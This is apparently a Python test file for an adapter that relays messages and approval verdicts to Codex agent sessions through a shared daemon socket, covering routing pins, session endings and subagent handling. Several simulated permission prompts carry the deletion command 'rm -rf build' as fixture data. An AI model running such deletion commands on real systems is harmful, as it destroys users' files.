        assert settings.socket_directory == Path("~/sockets").expanduser()

    def test_the_factory_builds_an_adapter_from_a_table(self) -> None:
        adapter = codex_agent(sink=Sink(), settings={"receipt_timeout_seconds": 2})
        assert isinstance(adapter, CodexAgentAdapter)


async def _settled() -> None:
    """Let the reader task deliver whatever the far side just sent."""
    for _ in range(10):
        await asyncio.sleep(0)
    await asyncio.sleep(0.02)


async def _until(condition, timeout: float = 2.0) -> None:
    loop = asyncio.get_running_loop()
    deadline = loop.time() + timeout
    while loop.time() < deadline:
        if condition():
            return
        await asyncio.sleep(0.005)
    raise AssertionError("the far side never got there")


class TestWhenCodexIgnoresThePin:
    def test_a_turn_whose_pin_was_dropped_is_caught_by_the_readback(
        self, socket_path: Path
    ) -> None:
        """`turn/start` answers with the turn only, so the assertion needs an echo."""

        async def scenario():
            async with Codex(socket_path).script(
                approval_policy="never", reviewer="auto_review"
            ) as server:
                server.honours_the_pin = False
                adapter = await watching(server, Sink())
                try:
                    first = await adapter.answer_relay(TARGET, "one", request_id=rid("r-1"))
                    routing = adapter._threads[TARGET].routing
                    second = await adapter.answer_relay(TARGET, "two", request_id=rid("r-2"))
                    return first, routing, second, server.calls_to("turn/start")
                finally:
                    await adapter.aclose()

        first, routing, second, starts = asyncio.run(scenario())
        # The words did arrive, and the receipt says only that.
        assert first.outcome is Delivery.DELIVERED
        # The mis-route is caught without waiting for a notification to land.
        assert routing is ApprovalRouting.MISROUTED
        assert second.outcome is Delivery.FAILED
        assert "auto_review" in second.reason
        assert [call["clientUserMessageId"] for call in starts] == ["r-1"]

    def test_a_server_that_honours_the_pin_leaves_the_session_usable(
        self, socket_path: Path
    ) -> None:
        async def scenario():
            async with Codex(socket_path).script(
                approval_policy="never", reviewer="auto_review"
            ) as server:
                adapter = await watching(server, Sink())
                try:
                    first = await adapter.answer_relay(TARGET, "one", request_id=rid("r-1"))
                    second = await adapter.answer_relay(TARGET, "two", request_id=rid("r-2"))
                    return first, second, adapter._threads[TARGET].routing
                finally:
                    await adapter.aclose()

        first, second, routing = asyncio.run(scenario())
        assert first.outcome is Delivery.DELIVERED
        assert second.outcome is Delivery.DELIVERED
        assert routing is ApprovalRouting.PINNED


class TestWhenTheSessionsAppServerDies:
    def test_the_session_is_marked_ended_exactly_once(self, socket_path: Path) -> None:
        """A TUI is a thin client of its app-server: no app-server, no Session."""
        sink = Sink()

        async def scenario():
            async with Codex(socket_path).script() as server:
                adapter = await watching(server, sink)
                try:
                    await server.drop_everyone()
                    await _until(lambda: bool(sink.of(SessionEnded)))
                    await _settled()
                    return sink.of(SessionEnded), adapter.watching()
                finally:
                    await adapter.aclose()

        ended, still_watched = asyncio.run(scenario())
        assert [event.target for event in ended] == [TARGET]
        assert ended[0].detail
        # Dropped from the roster, so nothing keeps addressing a dead socket.
        assert still_watched == ()

    def test_a_relay_after_it_died_fails_before_anything_is_sent(self, socket_path: Path) -> None:
        sink = Sink()

        async def scenario():
            async with Codex(socket_path).script() as server:
                adapter = await watching(server, sink)
                try:
                    await server.drop_everyone()
                    await _until(lambda: bool(sink.of(SessionEnded)))
                    return await adapter.answer_relay(TARGET, "ship it", request_id=rid())
                finally:
                    await adapter.aclose()

        receipt = asyncio.run(scenario())
        assert receipt.outcome is Delivery.FAILED
        assert PRE_WIRE_UNREACHABLE in receipt.reason

    def test_an_orderly_close_is_not_reported_as_a_session_ending(self, socket_path: Path) -> None:
        """Shutting the engine down must not tell the hub every Session died."""
        sink = Sink()

        async def scenario():
            async with Codex(socket_path).script() as server:
                adapter = await watching(server, sink)
                await adapter.aclose()
                await _settled()

        asyncio.run(scenario())
        assert sink.of(SessionEnded) == []


def daemon_at(path: Path) -> SharedDaemon:
    """A shared daemon that is really there, listening on the scripted server.

    `attach` is the shipped one — the same dial `register_session` makes — so
    what these tests exercise is the real client of a real socket, with only the
    *lookup* replaced. The lookup is the part that would otherwise find the
    machine's own daemon (`tests/conftest.py`).
    """

    async def found(_executable: str) -> tuple[DaemonAddress, str]:
        return DaemonAddress(socket_path=path, cli_version="t", app_server_version="t"), ""

    return SharedDaemon(settings=CodexSettings(), version="test", locate=found)


async def joined(server: Codex, sink: Sink, settings: CodexSettings | None = None):
    """An adapter that has joined the shared daemon and registered nothing.

    This is the shape the product actually runs in: v1.0 launches no Session
    (#72), so nothing ever calls `register_session`, and every Codex Session on
    the machine is reached through the daemon it joined (#76, #77).
    """

    async def no_other_sessions() -> list[Any]:
        """The machine's own `codex` processes are nobody's business here."""
        return []

    return CodexAgentAdapter(
        sink=sink,
        settings=settings or quick(),
        daemon=daemon_at(server.path),
        processes=no_other_sessions,
    )


class TestNotSubscribingToAChildProcess:
    """#79: the lane does not watch what it will never speak to.

    **This is where the Child Process rule has to bite, not only in Bridge
    Core.** `discover` adopts every row it comes back with, and adopting is
    `thread/resume` — the call that subscribes this adapter to a thread's
    permission prompts. A child adopted here raises `AwaitingApproval` and
    `SessionStopped` like anything else, and Bridge Core's guard reads a target
    the roster has not observed yet as *unknown* rather than as a child, so a
    prompt raised in the window between the first sighting and the registry
    holding the row would be announced — and answering it would carry the user's
    verdict to `approval_relay`, which consults no registry at all.

    Not subscribing closes the window at its source, and the evidence is already
    here: `SessionInspection.child` is on the row this method is handed. It also
    saves the half-megabyte `thread/resume` answer per child that `TurnCache`
    exists to avoid repeating.
    """

    def test_a_subagent_thread_is_listed_and_never_resumed(self, socket_path: Path) -> None:
        async def scenario():
            async with Codex(socket_path).script() as server:
                server.thread_source = "subagent"
                adapter = await joined(server, Sink())
                try:
                    lane = await adapter.discover()
                    return lane, server.calls_to("thread/resume"), adapter.watching()
                finally:
                    await adapter.aclose()

        lane, resumed, watching = asyncio.run(scenario())
        assert [row.child.kind for row in lane.rows] == [ChildKind.CHILD]
        assert resumed == []
        assert watching == ()

    def test_the_users_own_thread_is_resumed_as_it_always_was(self, socket_path: Path) -> None:
        """The rule is about children. Adopting a Session is how prompts arrive at all."""

        async def scenario():
            async with Codex(socket_path).script() as server:
                server.thread_source = "user"
                adapter = await joined(server, Sink())
                try:
                    await adapter.discover()
                    return server.calls_to("thread/resume"), adapter.watching()
                finally:
                    await adapter.aclose()

        resumed, watching = asyncio.run(scenario())
        assert len(resumed) == 1
        assert watching == (TARGET,)

    def test_a_thread_that_names_no_source_is_resumed_too(self, socket_path: Path) -> None:
        """Absent is not a claim — the same reading `discovery._child_of` gives it."""

        async def scenario():
            async with Codex(socket_path).script() as server:
                adapter = await joined(server, Sink())
                try:
                    await adapter.discover()
                    return server.calls_to("thread/resume")
                finally:
                    await adapter.aclose()

        assert len(asyncio.run(scenario())) == 1


class TestReachingASessionThroughTheSharedDaemon:
    """The route the product actually has (#77, advisor ruling Q2).

    `register_session` is called by nothing in `src/`: it wants a per-Session
    app-server socket that only a launch wrapper could supply, and v1.0 launches
    nothing (#72). So every Relay and every verdict goes over the one connection
    this engine joined — `SharedDaemon.client()`, which #76 built — and a Session
    the daemon holds is reachable without anything having registered it.

    Join-only throughout (ADR 0012): nothing here starts a daemon or stops one.
    """

    def test_a_relay_reaches_a_session_nothing_registered(self, socket_path: Path) -> None:
        async def scenario():
            async with Codex(socket_path).script() as server:
                adapter = await joined(server, Sink())
                try:
                    receipt = await adapter.answer_relay(TARGET, "ship it", request_id=rid())
                    return receipt, server.calls_to("turn/start")
                finally:
                    await adapter.aclose()

        receipt, started = asyncio.run(scenario())
        assert receipt.outcome is Delivery.DELIVERED
        assert [call["threadId"] for call in started] == [THREAD]

    def test_the_receipt_is_still_the_exact_id_readback(self, socket_path: Path) -> None:
        """P8: the protocol is unchanged. Only the wire it rides moved."""

        async def scenario():
            async with Codex(socket_path).script() as server:
                server.readback_shows_words = False
                adapter = await joined(server, Sink())
                try:
                    return await adapter.answer_relay(TARGET, "ship it", request_id=rid())
                finally:
                    await adapter.aclose()

        receipt = asyncio.run(scenario())
        assert receipt.outcome is Delivery.UNKNOWN
        assert "never showed the words" in receipt.reason

    def test_one_connection_carries_every_session(self, socket_path: Path) -> None:
        """A dial per Session would have the daemon holding one client per TUI."""
        second = SessionTarget(agent=AgentKind.CODEX, session_id="01a02110-0000-7000-8000-00000000")

        async def scenario():
            async with Codex(socket_path).script() as server:
                adapter = await joined(server, Sink())
                try:
                    await adapter.answer_relay(TARGET, "one", request_id=rid("r-1"))
                    await adapter.answer_relay(second, "two", request_id=rid("r-2"))
                    return server.connection_count
                finally:
                    await adapter.aclose()

        assert asyncio.run(scenario()) == 1

    def test_letting_go_of_one_session_does_not_let_go_of_the_rest(self, socket_path: Path) -> None:
        """The connection is the daemon's. Forgetting one thread must not close it."""

        async def scenario():
            async with Codex(socket_path).script() as server:
                adapter = await joined(server, Sink())
                try:
                    await adapter.answer_relay(TARGET, "one", request_id=rid("r-1"))
                    await adapter.forget_session(TARGET)
                    second = await adapter.answer_relay(TARGET, "two", request_id=rid("r-2"))
                    return second, server.connection_count
                finally:
                    await adapter.aclose()

        receipt, connections = asyncio.run(scenario())
        assert receipt.outcome is Delivery.DELIVERED
        assert connections == 1

    def test_a_verdict_rides_the_same_connection(self, socket_path: Path) -> None:
        async def scenario():
            async with Codex(socket_path).script() as server:
                sink = Sink()
                adapter = await joined(server, sink)
                try:
                    await adapter.discover()
                    wire_id = await server.ask_all(
                        APPROVAL, {"threadId": THREAD, "command": "rm -rf build"}
                    )
                    await _until(lambda: bool(sink.of(AwaitingApproval)))
                    request = sink.of(AwaitingApproval)[0].request
                    verdict = asyncio.ensure_future(
                        adapter.approval_relay(request, ApprovalVerdict.ALLOW, request_id=rid())
                    )
                    await _until(lambda: server.answered(wire_id))
                    await server.notify_all(
                        "serverRequest/resolved", {"threadId": THREAD, "requestId": wire_id}
                    )
                    return await verdict
                finally:
                    await adapter.aclose()

        assert asyncio.run(scenario()).outcome is Delivery.DELIVERED


class TestWhatADiscoveredThreadGetsSubscribedTo:
    """Adoption on the cadence, because a prompt belongs to the user's own turn.

    A permission prompt is fanned out to every *subscribed* client. A thread
    nothing resumed raises a dialog this adapter never sees — and the turn that
    raises it is usually one the user started in their own TUI, not one this
    engine sent. Waiting until the first Relay would mean the bridge could only
    be called about work it had itself asked for.
    """

    def test_discovery_subscribes_to_every_thread_the_daemon_holds(self, socket_path: Path) -> None:
        async def scenario():
            async with Codex(socket_path).script() as server:
                adapter = await joined(server, Sink())
                try:
                    await adapter.discover()
                    return adapter.watching(), server.calls_to("thread/resume")
                finally:
                    await adapter.aclose()

        watching, resumed = asyncio.run(scenario())
        assert [target.session_id for target in watching] == [THREAD]
        assert [call["threadId"] for call in resumed] == [THREAD]

    def test_it_resumes_each_thread_once_however_many_ticks_pass(self, socket_path: Path) -> None:
        """`thread/resume` answers with the whole turn history. Once per thread."""

        async def scenario():
            async with Codex(socket_path).script() as server:
                adapter = await joined(server, Sink())
                try:
                    await adapter.discover()
                    await adapter.discover()
                    await adapter.discover()
                    return server.calls_to("thread/resume")
                finally:
                    await adapter.aclose()

        assert len(asyncio.run(scenario())) == 1

    def test_a_prompt_raised_by_the_users_own_turn_reaches_the_user(
        self, socket_path: Path
    ) -> None:
        """The whole reason adoption is on the cadence rather than on a Relay."""

        async def scenario():
            async with Codex(socket_path).script() as server:
                sink = Sink()
                adapter = await joined(server, sink)
                try:
                    await adapter.discover()
                    await server.ask_all(APPROVAL, {"threadId": THREAD, "command": "rm -rf build"})
                    await _until(lambda: bool(sink.of(AwaitingApproval)))
                    return sink.of(AwaitingApproval)[0].request
                finally:
                    await adapter.aclose()

        request = asyncio.run(scenario())
        assert request.target == TARGET
        # The shell text does **not** travel (#109). It reached the user until
        # then, on the one lane whose extractor was not the shared one: a summary
        # is description-class text only, and `command` is what
        # `legacy@1d32845:bridge/transcript.py:1779-1790` keeps out of anything
        # read aloud. With no `reason` the prompt names itself and no more.
        assert "rm -rf build" not in request.detail
        assert request.detail == "a shell command"


class TestWhatACodexRowSaysItStoppedOn:
    """The projection the Codex lane never had (#77, from #75's review).

    `_asked` raised `AwaitingApproval` and stopped, so a Codex roster row could
    not say what its Session had stopped on while a Claude row could. This is the
    same request in the seam's one inspection vocabulary — **not** a second
    reader: no transcript parser for Codex, ever, because the rollout on disk is
    worse evidence for a question the app-server already answered (P6, P13).
    """

    async def row_with_a_dialog(self, server: Codex, sink: Sink, adapter):
        await adapter.discover()
        await server.ask_all(APPROVAL, {"threadId": THREAD, "command": "rm -rf build"})
        await _until(lambda: bool(sink.of(AwaitingApproval)))
        lane = await adapter.discover()
        return next(row for row in lane.rows if row.target.session_id == THREAD)

    def test_a_pending_dialog_shows_on_the_row(self, socket_path: Path) -> None:
        async def scenario():
            async with Codex(socket_path).script() as server:
                sink = Sink()
                adapter = await joined(server, sink)
                try:
                    return await self.row_with_a_dialog(server, sink, adapter)
                finally:
                    await adapter.aclose()

        row = asyncio.run(scenario())
        assert row.waiting_for.kind is WaitingKind.PERMISSION
        assert row.waiting_for.tool_name == "a shell command"
        # Same rule on the roster row as in the announcement — one extractor
        # builds both, which is why it could only ever be one answer (#109).
        assert "rm -rf build" not in (row.waiting_for.detail or "")

    def test_the_row_carries_the_handle_the_verdict_is_answered_with(
        self, socket_path: Path
    ) -> None:
        """`as_approval_request` needs it, and a row without one claims no route."""

        async def scenario():
            async with Codex(socket_path).script() as server:
                sink = Sink()
                adapter = await joined(server, sink)
                try:
                    row = await self.row_with_a_dialog(server, sink, adapter)
                    return row, sink.of(AwaitingApproval)[0].request
                finally:
                    await adapter.aclose()

        row, request = asyncio.run(scenario())
        assert row.waiting_for.approval_id == request.approval_id
        assert row.waiting_for.as_approval_request(row.target) is not None

    def test_the_stop_says_what_it_stopped_on_too(self, socket_path: Path) -> None:
        """The row and the Stop are one reading, not two that agree most of the time.

        It matters more here than on the roster: a Codex permission already
        reaches the user through `AwaitingApproval`, so a `SessionStopped` with
        no `approval_id` is one Bridge Core cannot recognise as the same dialog —
        it announces that too, and the user is asked twice for one decision.
        """
        sink = Sink()

        async def scenario():
            async with Codex(socket_path).script() as server:
                adapter = await watching(server, sink)
                try:
                    await server.notify_all(
                        "thread/status/changed",
                        {"threadId": THREAD, "status": {"type": "active", "activeFlags": []}},
                    )
                    await _settled()
                    await server.ask_all(APPROVAL, {"threadId": THREAD, "command": "rm -rf build"})
                    await _until(lambda: bool(sink.of(AwaitingApproval)))
                    await server.notify_all(
                        "thread/status/changed",
                        {"threadId": THREAD, "status": {"type": "idle"}},
                    )
                    await _settled()
                finally:
                    await adapter.aclose()

        asyncio.run(scenario())
        (stopped,) = sink.of(SessionStopped)
        assert stopped.waiting_for.kind is WaitingKind.PERMISSION
        assert stopped.waiting_for.tool_name == "a shell command"
        assert stopped.waiting_for.approval_id == sink.of(AwaitingApproval)[0].request.approval_id
        assert stopped.waiting_for.as_approval_request(stopped.target) is not None

    def test_a_stop_with_no_dialog_still_says_it_stopped_on_nothing(
        self, socket_path: Path
    ) -> None:
        """The control: the projection fills a gap and never invents one."""
        sink = Sink()

        async def scenario():
            async with Codex(socket_path).script() as server:
                adapter = await watching(server, sink)
                try:
                    await server.notify_all(
                        "thread/status/changed",
                        {"threadId": THREAD, "status": {"type": "active", "activeFlags": []}},
                    )
                    await _settled()
                    await server.notify_all(
                        "thread/status/changed",
                        {"threadId": THREAD, "status": {"type": "idle"}},
                    )
                    await _settled()
                finally:
                    await adapter.aclose()

        asyncio.run(scenario())
        (stopped,) = sink.of(SessionStopped)
        assert stopped.waiting_for.kind is WaitingKind.NONE

    def test_a_row_with_no_dialog_is_left_exactly_as_the_roster_read_it(
        self, socket_path: Path
    ) -> None:
        async def scenario():
            async with Codex(socket_path).script() as server:
                adapter = await joined(server, Sink())
                try:
                    lane = await adapter.discover()
                    return next(row for row in lane.rows if row.target.session_id == THREAD)
                finally:
                    await adapter.aclose()

        assert asyncio.run(scenario()).waiting_for.kind is WaitingKind.NONE


class TestWhenTheSharedDaemonLetsGo:
    """A daemon blip is not nine Sessions dying. The roster is the authority."""

    def test_no_session_is_reported_ended(self, socket_path: Path) -> None:
        """Ending a row terminates every Relay queued for it. Far too expensive a guess."""

        async def scenario():
            async with Codex(socket_path).script() as server:
                sink = Sink()
                adapter = await joined(server, sink)
                try:
                    await adapter.discover()
                    await server.drop_everyone()
                    await _until(lambda: not adapter.watching())
                    return sink.of(SessionEnded)
                finally:
                    await adapter.aclose()

        assert asyncio.run(scenario()) == []

    def test_the_watch_is_dropped_so_the_next_discovery_picks_it_up_again(
        self, socket_path: Path
    ) -> None:
        async def scenario():
            async with Codex(socket_path).script() as server:
                adapter = await joined(server, Sink())
                try:
                    await adapter.discover()
                    await server.drop_everyone()
                    await _until(lambda: not adapter.watching())
                    await adapter.discover()
                    return adapter.watching()
                finally:
                    await adapter.aclose()

        assert [target.session_id for target in asyncio.run(scenario())] == [THREAD]
